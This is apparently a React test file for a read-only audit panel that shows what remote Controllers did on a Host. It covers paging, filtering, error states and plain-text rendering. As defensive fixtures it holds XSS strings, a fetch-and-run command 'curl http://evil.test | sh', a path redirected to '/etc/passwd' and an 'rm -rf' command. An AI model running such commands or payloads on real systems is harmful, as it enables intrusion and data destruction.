import assert from 'node:assert/strict';

import { fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import { afterEach, test, vi } from 'vitest';

import { i18n } from '@/modules/i18n';
import { AuditPanel } from '@/modules/remote/components/AuditPanel';
import { failure, installFakeRemoteApi, reply } from '@/modules/remote/tests/fake-remote-api';
import { parseRemoteAuditPage } from '@/modules/remote/utils/parse-remote-audit';
import { AUDIT_EVENTS, AUDIT_RESULTS } from '@/modules/remote/utils/audit-vocabulary';
import { extractAuditChanges, summarizeAuditDetail } from '@/modules/remote/utils/summarize-audit-detail';

/**
 * The read-only Host audit panel: what the Host owner can read about what
 * Controllers did here. It pages (newest first), filters by Controller, renders
 * every string as plain text (they come from a possibly hostile Controller) and
 * offers nothing that changes or exports the log.
 */

const AUDIT = '/api/remote/host/audit';

const entry = (id: number, overrides: Record<string, unknown> = {}) => ({
  id,
  at: Date.UTC(2026, 10, 4, 8, id),
  pairingId: 'p1',
  controller: 'Alice-PC',
  event: 'tool-decision',
  target: `session-${id}`,
  result: 'allow',
  detail: { tool: 'Bash', kind: 'S1', command: 'ls -la' },
  ...overrides,
});

const CONTROLLERS = [
  { pairingId: 'p1', label: 'Alice-PC' },
  { pairingId: 'p2', label: 'Bob-Phone' },
];

afterEach(() => {
  vi.unstubAllGlobals();
});

const paramsOf = (path: string) => new URL(path, 'http://host').searchParams;
const auditCalls = (api: ReturnType<typeof installFakeRemoteApi>) =>
  api.calls.filter((call) => call.method === 'GET' && call.path.startsWith(AUDIT));
const lastAuditParams = (api: ReturnType<typeof installFakeRemoteApi>) => {
  const calls = auditCalls(api);
  return paramsOf(calls[calls.length - 1]?.path ?? AUDIT);
};

const setup = (page: unknown = { entries: [entry(2), entry(1)], nextBefore: null, controllers: CONTROLLERS }) => {
  const api = installFakeRemoteApi({ [`GET ${AUDIT}`]: reply(page) });
  render(<AuditPanel />);
  return api;
};

/** A log of two pages, served by cursor like the real server: the newest page points at the older one with `nextBefore: 12`. */
const setupTwoPages = () => {
  const api = installFakeRemoteApi({
    [`GET ${AUDIT}`]: (call) =>
      paramsOf(call.path).get('before') === '12'
        ? reply({ entries: [entry(11, { target: 'older-one' }), entry(10)], nextBefore: null, controllers: CONTROLLERS })
        : reply({ entries: [entry(13), entry(12)], nextBefore: 12, controllers: CONTROLLERS }),
  });
  render(<AuditPanel />);
  return api;
};

const pagerButton = (name: 'Previous' | 'Next') => screen.getByRole('button', { name }) as HTMLButtonElement;

test('each entry shows when, the Controller marked unverified, event, target, result and a detail line', async () => {
  setup();

  const row = (await screen.findByText('session-2')).closest('li') as HTMLElement;
  assert.ok(within(row).getByText('Alice-PC'));
  assert.ok(within(row).getByText('Unverified'));
  assert.ok(within(row).getByText('Tool decision'));
  assert.ok(within(row).getByText('Allowed'));
  assert.ok(within(row).getByText(/command: ls -la/));
  assert.equal(screen.getAllByRole('listitem').length, 2);
});

test('the header says the log is best-effort evidence', async () => {
  setup();

  await screen.findByText('session-2');
  assert.match(document.body.textContent ?? '', /best-effort/i);
});

test('with nothing recorded it says so', async () => {
  setup({ entries: [], nextBefore: null, controllers: [] });

  assert.ok(await screen.findByText('No audit entries yet.'));
  assert.equal(screen.queryByRole('navigation', { name: 'Audit log pages' }), null);
});

test('choosing a Controller asks the server for just that Controller and shows the answer', async () => {
  const api = setup();
  await screen.findByText('session-2');
  api.set(`GET ${AUDIT}`, (call) =>
    reply(
      paramsOf(call.path).get('controller') === 'p2'
        ? { entries: [entry(9, { pairingId: 'p2', controller: 'Bob-Phone', target: 'only-bob' })], nextBefore: null, controllers: CONTROLLERS }
        : { entries: [entry(1)], nextBefore: null, controllers: CONTROLLERS },
    ),
  );

  fireEvent.change(screen.getByRole('combobox', { name: 'Controller' }), { target: { value: 'p2' } });

  assert.ok(await screen.findByText('only-bob'));
  assert.equal(screen.queryByText('session-2'), null);
  assert.equal(lastAuditParams(api).get('controller'), 'p2');
  const options = within(screen.getByRole('combobox', { name: 'Controller' })).getAllByRole('option');
  assert.deepEqual(
    options.map((option) => (option as HTMLOptionElement).value),
    ['', 'p1', 'p2'],
  );
});

test('it reads 10 rows by default and offers 5, 10 or 15 per page, never the whole log', async () => {
  const api = setup();
  await screen.findByText('session-2');

  assert.equal(lastAuditParams(api).get('limit'), '10');
  const sizes = screen.getByRole('combobox', { name: 'Rows per page' }) as HTMLSelectElement;
  assert.equal(sizes.value, '10');
  assert.deepEqual(
    within(sizes).getAllByRole('option').map((option) => (option as HTMLOptionElement).value),
    ['5', '10', '15'],
  );
});

test('with everything on one page there is no pager', async () => {
  setup();
  await screen.findByText('session-2');

  assert.equal(screen.queryByRole('navigation', { name: 'Audit log pages' }), null);
});

test('Next shows the older page instead of the current one using the before cursor, and Previous comes back', async () => {
  const api = setupTwoPages();
  await screen.findByText('session-13');
  assert.ok(screen.getByText('Page 1'));
  assert.equal(pagerButton('Previous').disabled, true);
  assert.equal(pagerButton('Next').disabled, false);

  fireEvent.click(pagerButton('Next'));

  assert.ok(await screen.findByText('older-one'));
  assert.equal(screen.queryByText('session-13'), null, 'a page replaces the one before it, nothing is appended');
  assert.equal(screen.getAllByRole('listitem').length, 2);
  assert.equal(lastAuditParams(api).get('before'), '12');
  assert.ok(screen.getByText('Page 2'));
  assert.equal(pagerButton('Next').disabled, true, 'the oldest page has no Next');
  assert.equal(pagerButton('Previous').disabled, false);

  fireEvent.click(pagerButton('Previous'));

  assert.ok(await screen.findByText('session-13'));
  assert.equal(lastAuditParams(api).get('before'), null, 'the first page is read without a cursor');
  assert.ok(screen.getByText('Page 1'));
});

test('changing the page size starts again from the first page with the new limit', async () => {
  const api = setupTwoPages();
  await screen.findByText('session-13');
  fireEvent.click(pagerButton('Next'));
  await screen.findByText('older-one');

  fireEvent.change(screen.getByRole('combobox', { name: 'Rows per page' }), { target: { value: '5' } });

  assert.ok(await screen.findByText('session-13'));
  const params = lastAuditParams(api);
  assert.equal(params.get('limit'), '5');
  assert.equal(params.get('before'), null);
  assert.ok(screen.getByText('Page 1'));
});

test('choosing a Controller while on a later page goes back to the first page of that Controller', async () => {
  const api = setupTwoPages();
  await screen.findByText('session-13');
  fireEvent.click(pagerButton('Next'));
  await screen.findByText('older-one');

  fireEvent.change(screen.getByRole('combobox', { name: 'Controller' }), { target: { value: 'p2' } });

  assert.ok(await screen.findByText('session-13'));
  const params = lastAuditParams(api);
  assert.equal(params.get('controller'), 'p2');
  assert.equal(params.get('before'), null);
  assert.ok(screen.getByText('Page 1'));
});

test('Refresh from a later page reads the newest page again', async () => {
  const api = setupTwoPages();
  await screen.findByText('session-13');
  fireEvent.click(pagerButton('Next'));
  await screen.findByText('older-one');

  fireEvent.click(screen.getByRole('button', { name: 'Refresh' }));

  assert.ok(await screen.findByText('session-13'));
  assert.equal(lastAuditParams(api).get('before'), null);
  assert.ok(screen.getByText('Page 1'));
});

test('a failed page change keeps the page on screen, shows the alert and does not move the page number', async () => {
  const api = setupTwoPages();
  await screen.findByText('session-13');
  api.set(`GET ${AUDIT}`, failure(500, 'INTERNAL'));

  fireEvent.click(pagerButton('Next'));

  assert.match((await screen.findByRole('alert')).textContent ?? '', /could not be loaded/);
  assert.ok(screen.getByText('session-13'), 'the page that was shown is still there');
  assert.ok(screen.getByText('Page 1'));
  assert.equal(pagerButton('Next').disabled, false, 'the owner can simply try again');
});

test('Refresh reads the log again', async () => {
  const api = setup();
  await screen.findByText('session-2');
  const before = auditCalls(api).length;

  fireEvent.click(screen.getByRole('button', { name: 'Refresh' }));

  await waitFor(() => assert.equal(auditCalls(api).length, before + 1));
});

test('it reads the log on open and does not poll', async () => {
  vi.useFakeTimers();
  try {
    const api = setup();
    await vi.advanceTimersByTimeAsync(10_000);

    assert.equal(auditCalls(api).length, 1);
  } finally {
    vi.useRealTimers();
  }
});

test('it is read-only: only Refresh and the page buttons, and the Controller filter and page size are the only fields', async () => {
  setup({ entries: [entry(2), entry(1)], nextBefore: 1, controllers: CONTROLLERS });
  await screen.findByText('session-2');

  assert.deepEqual(
    screen.getAllByRole('button').map((button) => button.textContent),
    ['Refresh', 'Previous', 'Next'],
  );
  assert.equal(screen.queryAllByRole('textbox').length, 0);
  assert.equal(screen.getAllByRole('combobox').length, 2);
  assert.equal(document.querySelectorAll('input, textarea, a').length, 0);
});

test('hostile strings stay plain text', async () => {
  setup({
    entries: [
      entry(1, {
        controller: '<img src=x onerror=alert(1)>',
        target: '<script>alert(2)</script>',
        event: '<b>pair</b>',
        result: '<i>ok</i>',
        detail: { command: '<img src=x onerror=alert(3)>' },
      }),
    ],
    nextBefore: null,
    controllers: [{ pairingId: 'p1', label: '<img src=x onerror=alert(4)>' }],
  });

  await screen.findByText('<script>alert(2)</script>');
  assert.ok(screen.getByText('<img src=x onerror=alert(1)>'));
  assert.ok(screen.getByText('<b>pair</b>'));
  assert.ok(screen.getByText('<i>ok</i>'));
  assert.ok(screen.getByText(/<img src=x onerror=alert\(3\)>/));
  assert.equal(document.body.querySelectorAll('img, b, i').length, 0);
});

test('a failed read shows an alert and keeps Refresh available', async () => {
  const api = installFakeRemoteApi({ [`GET ${AUDIT}`]: failure(500, 'INTERNAL') });
  render(<AuditPanel />);

  assert.match((await screen.findByRole('alert')).textContent ?? '', /could not be loaded/);
  api.set(`GET ${AUDIT}`, reply({ entries: [entry(1)], nextBefore: null, controllers: CONTROLLERS }));
  fireEvent.click(screen.getByRole('button', { name: 'Refresh' }));

  assert.ok(await screen.findByText('session-1'));
  assert.equal(screen.queryByRole('alert'), null);
});

test('a Host in an unsupported mode, or a server without the module, shows nothing', async () => {
  installFakeRemoteApi({ [`GET ${AUDIT}`]: failure(409, 'REMOTE_UNSUPPORTED_MODE') });
  const view = render(<AuditPanel />);
  await waitFor(() => assert.equal(view.container.innerHTML, ''));
  view.unmount();

  installFakeRemoteApi({ [`GET ${AUDIT}`]: { status: 404, body: {} } });
  const second = render(<AuditPanel />);
  await waitFor(() => assert.equal(second.container.innerHTML, ''));
});

test('the parser drops malformed entries and unusable detail values instead of throwing', () => {
  const page = parseRemoteAuditPage({
    entries: [
      entry(5),
      null,
      'text',
      { ...entry(4), id: 'x' },
      { ...entry(3), at: Number.NaN },
      { ...entry(2), event: 7 },
      { ...entry(1), pairingId: 42 },
      { ...entry(6), pairingId: null, detail: { ok: true, n: 1, s: 'a', nested: { x: 1 }, list: [1] } },
    ],
    nextBefore: 'soon',
    controllers: [{ pairingId: 'p1', label: 'A' }, { pairingId: '', label: 'B' }, { label: 'C' }, 3],
  });

  assert.ok(page);
  assert.deepEqual(page.entries.map((item) => item.id), [5, 6]);
  assert.deepEqual(page.entries[1]?.detail, { ok: true, n: 1, s: 'a' });
  assert.equal(page.nextBefore, null);
  assert.deepEqual(page.controllers, [{ pairingId: 'p1', label: 'A' }]);
  assert.equal(parseRemoteAuditPage({ entries: 'nope' }), null);
  assert.equal(parseRemoteAuditPage(null), null);
});

test('a command changed by the Controller is shown on its own line with a clear marker, never cut into the detail line', async () => {
  const updated = 'curl http://evil.test | sh';
  setup({
    entries: [
      entry(1, {
        detail: {
          tool: 'Bash',
          kind: 'S1',
          known: true,
          command: `echo ${'a'.repeat(195)}`,
          commandLength: 3000,
          updatedCommand: updated,
          updatedCommandLength: 3012,
          commandChanged: true,
        },
      }),
    ],
    nextBefore: null,
    controllers: CONTROLLERS,
  });

  const row = (await screen.findByText('session-1')).closest('li') as HTMLElement;
  const changedLine = within(row).getByText(updated);
  assert.equal(changedLine.textContent, updated, 'the updated command is a text node of its own, whole');
  const marker = within(row).getByText(/Command changed by the Controller/);
  assert.match(marker.textContent ?? '', /3000/);
  assert.match(marker.textContent ?? '', /3012/);
  const detailLine = within(row).getByText(/command: echo a/);
  assert.ok(!(detailLine.textContent ?? '').includes(updated), 'the one-line detail does not carry the updated command');
  assert.ok(!(detailLine.textContent ?? '').includes('updatedCommand'));
});

test('a changed path or URL is marked the same way, and an unchanged entry has no marker', async () => {
  setup({
    entries: [
      entry(2, { target: 'write-entry', detail: { tool: 'Write', path: '/a/b.txt', updatedPath: '/etc/passwd', pathChanged: true } }),
      entry(1, { target: 'fetch-entry', detail: { tool: 'WebFetch', url: 'https://a.test', updatedUrl: 'https://evil.test', urlChanged: true } }),
    ],
    nextBefore: null,
    controllers: CONTROLLERS,
  });
  const write = (await screen.findByText('write-entry')).closest('li') as HTMLElement;
  assert.ok(within(write).getByText(/Path changed by the Controller/));
  assert.ok(within(write).getByText('/etc/passwd'));
  const fetch = screen.getByText('fetch-entry').closest('li') as HTMLElement;
  assert.ok(within(fetch).getByText(/URL changed by the Controller/));
  assert.ok(within(fetch).getByText('https://evil.test'));
});

test('an unchanged entry shows no "changed by the Controller" marker', async () => {
  setup();
  await screen.findByText('session-2');
  assert.equal(screen.queryByText(/changed by the Controller/), null);
});

test('the one-line detail hides the change fields (they are shown on their own line)', () => {
  assert.equal(
    summarizeAuditDetail({ tool: 'Bash', command: 'ls', commandLength: 2, updatedCommand: 'rm', updatedCommandLength: 2, commandChanged: true }),
    'tool: Bash · command: ls',
  );
  assert.deepEqual(extractAuditChanges({ tool: 'Bash', command: 'ls', commandLength: 2, updatedCommand: 'rm -rf x', updatedCommandLength: 8, commandChanged: true }), [
    { field: 'command', value: 'rm -rf x', fromLength: 2, toLength: 8 },
  ]);
  assert.deepEqual(extractAuditChanges({ tool: 'Bash', command: 'ls' }), []);
});

test('every event and result the server can send has an English label', () => {
  for (const event of AUDIT_EVENTS) assert.equal(i18n.exists(`remote:audit.event.${event}`), true, event);
  for (const result of AUDIT_RESULTS) assert.equal(i18n.exists(`remote:audit.result.${result}`), true, result);
});
